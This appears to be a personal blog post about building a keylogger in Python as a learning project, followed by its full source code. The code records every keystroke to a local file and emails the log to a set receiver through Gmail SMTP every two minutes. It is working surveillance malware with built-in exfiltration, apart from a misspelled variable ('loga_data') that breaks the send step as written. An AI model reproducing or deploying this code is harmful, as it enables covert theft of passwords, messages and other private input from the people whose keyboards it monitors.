---
author: "Rajshree"
title: "Keylogger in Python"
date: "2025-07-28"
draft: false
---

## Keylogger in Python - A passion project (sort of)
I tried my hands on making a keylogger, fully in python, and I learnt a **lot**! The inspiration behind this project is Grant Collin's video on trying to make one. I followed his foot-steps for the structure but the implementation was purely from my thought process.

Link to the project: https://github.com/rajkive/py-key-logger 

---
### What is a Keylogger?

A keylogger is a program that records every keystroke made on a keyboard. In this project, your keylogger will:
- Capture keystrokes

- Store them temporarily

- Send them to your email every 120 seconds (2 minutes)


There are some pre-requisites for this project. Mainly these dependencies: `pynput.keyboard, threading, smtplib, subprocess` It is good to have some knowledge of the syntax and how they work but if not, then this is the perfect opportunity to get familiar with it.

----

The general flow for the program was fairly simple. Set-up email configurations -> Implement function to start capturing keystrokes -> Send logs via email -> using timer for repeated execution. 

I tried to keep it simple and code the basic functionalities for each step. The only problem I encounterd was with smpt config for google. If you are using a gmail for this set-up there might be some problems with 2-factor auth or passkeys if the option is enabled. To debug it, I used a temp email for the reveiver and an Ethereal Email which create a free fake SMTP service for developers.

Overall this was a very fun project to do and took less than 2hrs. It was a good intro to lots of concepts essential for cyber and networking. 

#### Code:
```
import subprocess, smtplib, threading
from pynput.keyboard import Key, Listener

sender_email = "sender-example@gmail.com"
sender_password = "12345678"
receiver_email = "example@gmail.com"
open("log.txt", "a").close()

def logging(key):
    try:
        log = key.char
    except AttributeError:
        if key == Key.space:
            log = ' '
        elif key == Key.enter:
            log = '\n'
        elif key == Key.tab:
            log = '\t'
        else:
            log = f' [{key.name}] '

    with open("log.txt", "a") as f:
        f.write(log)


def send_mail():
    with open("log.txt", "r") as file:
        log_data = file.read()
        
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, loga_data)
        

    # clear the file after sending the email
    with open("log.txt", "w") as file:
        file.write("")
    
    threading.Timer(120, send_mail).start()
    
send_mail()

with Listener(on_press=logging) as listener:
    listener.join()
```